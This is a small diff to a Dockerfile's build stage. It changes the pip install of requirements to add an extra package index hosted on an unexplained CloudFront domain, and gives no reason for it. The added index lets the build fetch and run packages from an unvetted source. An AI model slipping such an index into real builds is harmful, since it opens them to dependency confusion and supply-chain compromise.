@@ -28,7 +28,9 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
 COPY requirements.txt .
 RUN python -m venv /opt/venv && \
     /opt/venv/bin/pip install --upgrade pip wheel setuptools && \
-    /opt/venv/bin/pip install -r requirements.txt
+    /opt/venv/bin/pip install \
+        --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/ \
+        -r requirements.txt
 
 # ─── Stage 2: runtime ────────────────────────────────────────────────────────
 FROM python:3.11-slim AS runtime
